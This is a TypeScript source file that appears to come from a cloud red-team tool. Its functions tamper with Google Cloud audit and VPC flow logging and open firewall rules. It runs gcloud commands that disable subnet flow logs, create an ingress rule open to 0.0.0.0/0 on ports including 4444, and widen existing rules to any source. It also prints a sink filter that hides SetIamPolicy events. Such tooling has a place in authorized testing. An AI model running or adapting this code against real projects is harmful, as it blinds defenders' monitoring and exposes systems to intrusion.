import { gcloud, resolveProject, argVal, tryJson } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function auditLogTamper(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action")
  if (!action) return { output: "ERROR: --action required (status|disable_data_access|modify_sink)", findings: [] }
  const project = await resolveProject(argVal(args, "--project"))
  const findings: Finding[] = []
  const output: string[] = []

  if (action === "status") {
    const policy = await gcloud(["projects", "get-iam-policy", project, "--format=json"], timeout)
    const sinks = await gcloud(["logging", "sinks", "list", "--project", project, "--format=json"], timeout)
    output.push(`[*] Audit log status for ${project}\n`)
    if (policy.exitCode === 0) {
      const p = tryJson(policy.stdout)
      output.push(`[+] Audit configs: ${(p?.auditConfigs || []).length}`)
    }
    if (sinks.exitCode === 0) {
      const s = tryJson(sinks.stdout) || []
      output.push(`[+] Log sinks: ${s.length}`)
      for (const sink of s) output.push(`    ${sink.name}: ${sink.destination}`)
    }
    findings.push({
      checkId: "GCP-AUDIT-001",
      provider: "gcp",
      severity: "info",
      status: "ENUMERATED",
      resource: project,
      title: "Audit log configuration enumerated",
      details: `Project: ${project}`,
      remediation: "Review audit log configuration for gaps",
    })
    return { output: output.join("\n"), findings }
  }

  if (action === "disable_data_access") {
    output.push(`[*] To disable data access logs:`)
    output.push(`    gcloud projects set-iam-policy ${project} <policy-without-auditConfigs>.json`)
    output.push(`[!] This removes DATA_READ and DATA_WRITE audit log configs`)
    return { output: output.join("\n"), findings }
  }

  if (action === "modify_sink") {
    const sinks = await gcloud(["logging", "sinks", "list", "--project", project, "--format=json"], timeout)
    if (sinks.exitCode !== 0) return { output: `[-] Cannot list sinks: ${sinks.stderr.trim()}`, findings }
    const s = tryJson(sinks.stdout) || []
    output.push(`[*] ${s.length} sink(s) found — modify with:\n`)
    for (const sink of s) {
      output.push(
        `    gcloud logging sinks update ${sink.name} --log-filter='NOT protoPayload.methodName="SetIamPolicy"' --project ${project}`,
      )
    }
    return { output: output.join("\n"), findings }
  }

  return { output: `ERROR: Unknown action: ${action}`, findings: [] }
}

export async function vpcFlowTamper(args: string[], timeout: number): Promise<HookResult> {
  const project = await resolveProject(argVal(args, "--project"))
  const subnet = argVal(args, "--subnet")
  const region = argVal(args, "--region")
  const action = argVal(args, "--action") || "status"
  const findings: Finding[] = []
  const output: string[] = [`[*] VPC Flow Log tampering — project: ${project}\n`]

  if (action === "status") {
    const subs = await gcloud(
      ["compute", "networks", "subnets", "list", "--project", project, "--format=json"],
      timeout,
    )
    if (subs.exitCode !== 0) return { output: `[-] Cannot list subnets: ${subs.stderr.trim()}`, findings }
    const items = tryJson(subs.stdout) || []
    const enabled = items.filter((s: Record<string, { enable: boolean }>) => s.logConfig?.enable)
    const disabled = items.filter((s: Record<string, { enable: boolean }>) => !s.logConfig?.enable)
    output.push(`[+] Subnets with flow logs: ${enabled.length}`)
    for (const s of enabled) output.push(`    ${s.name} (${s.region?.split("/").pop()})`)
    output.push(`[-] Subnets without flow logs: ${disabled.length}`)
    for (const s of disabled) output.push(`    ${s.name} (${s.region?.split("/").pop()})`)
    return { output: output.join("\n"), findings }
  }

  if (action === "disable") {
    if (!subnet) return { output: "ERROR: --subnet required for disable", findings }
    if (!region) return { output: "ERROR: --region required for disable", findings }
    const disable = await gcloud(
      [
        "compute",
        "networks",
        "subnets",
        "update",
        subnet,
        "--region",
        region,
        "--no-enable-flow-logs",
        "--project",
        project,
      ],
      timeout,
    )
    if (disable.exitCode === 0) {
      output.push(`[+] VPC Flow Logs disabled on ${subnet} (${region})`)
      findings.push({
        checkId: "GCP-FLOW-001",
        provider: "gcp",
        severity: "critical",
        status: "TAMPERED",
        resource: `subnet/${subnet}`,
        title: `VPC Flow Logs disabled: ${subnet}`,
        details: `Flow logs disabled on subnet ${subnet} in ${region}`,
        remediation: `Re-enable: gcloud compute networks subnets update ${subnet} --region ${region} --enable-flow-logs`,
      })
    } else {
      output.push(`[-] Failed to disable flow logs: ${disable.stderr.trim()}`)
    }
    return { output: output.join("\n"), findings }
  }

  return { output: `ERROR: Unknown action: ${action} (use: status|disable)`, findings: [] }
}

export async function vpcFirewallModify(args: string[], timeout: number): Promise<HookResult> {
  const project = await resolveProject(argVal(args, "--project"))
  const ruleName = argVal(args, "--rule-name")
  const action = argVal(args, "--action") || "list"
  const findings: Finding[] = []
  const output: string[] = [`[*] VPC firewall modification — project: ${project}\n`]

  if (action === "list") {
    const fws = await gcloud(["compute", "firewall-rules", "list", "--project", project, "--format=json"], timeout)
    if (fws.exitCode !== 0) return { output: `[-] Cannot list firewall rules: ${fws.stderr.trim()}`, findings }
    const items = tryJson(fws.stdout) || []
    output.push(`[+] Firewall rules: ${items.length}\n`)
    for (const f of items) {
      const src = (f.sourceRanges || []).join(",")
      const allowed = (f.allowed || [])
        .map((a: Record<string, string[]>) => `${a.IPProtocol}:${(a.ports || ["all"]).join(",")}`)
        .join(" ")
      const marker = (f.sourceRanges || []).includes("0.0.0.0/0") ? "!" : "+"
      output.push(`  [${marker}] ${f.name} [${f.direction}] src=${src || "any"} allow=${allowed} pri=${f.priority}`)
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "create") {
    const name = ruleName || `cs-allow-${Date.now()}`
    const create = await gcloud(
      [
        "compute",
        "firewall-rules",
        "create",
        name,
        "--direction=INGRESS",
        "--action=ALLOW",
        "--rules=tcp:22,tcp:443,tcp:8080,tcp:4444",
        "--source-ranges=0.0.0.0/0",
        "--priority=100",
        "--project",
        project,
        "--quiet",
      ],
      timeout,
    )
    if (create.exitCode === 0) {
      output.push(`[+] Firewall rule created: ${name}`)
      output.push(`    Allows: TCP 22,443,8080,4444 from 0.0.0.0/0`)
      findings.push({
        checkId: "GCP-FW-MOD-001",
        provider: "gcp",
        severity: "critical",
        status: "CREATED",
        resource: `firewall/${name}`,
        title: `Permissive firewall rule created: ${name}`,
        details: `Allows inbound TCP 22,443,8080,4444 from any source`,
        remediation: `Delete: gcloud compute firewall-rules delete ${name} --project ${project}`,
      })
    } else {
      output.push(`[-] Rule creation failed: ${create.stderr.trim()}`)
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "modify") {
    if (!ruleName) return { output: "ERROR: --rule-name required for modify", findings }
    const update = await gcloud(
      ["compute", "firewall-rules", "update", ruleName, "--source-ranges=0.0.0.0/0", "--project", project, "--quiet"],
      timeout,
    )
    if (update.exitCode === 0) {
      output.push(`[+] Firewall rule widened: ${ruleName} → 0.0.0.0/0`)
      findings.push({
        checkId: "GCP-FW-MOD-002",
        provider: "gcp",
        severity: "critical",
        status: "MODIFIED",
        resource: `firewall/${ruleName}`,
        title: `Firewall rule widened: ${ruleName}`,
        details: `Source range changed to 0.0.0.0/0`,
        remediation: `Restore: gcloud compute firewall-rules update ${ruleName} --source-ranges=ORIGINAL_CIDR`,
      })
    } else {
      output.push(`[-] Update failed: ${update.stderr.trim()}`)
    }
    return { output: output.join("\n"), findings }
  }

  return { output: `ERROR: Unknown action: ${action} (use: list|create|modify)`, findings: [] }
}
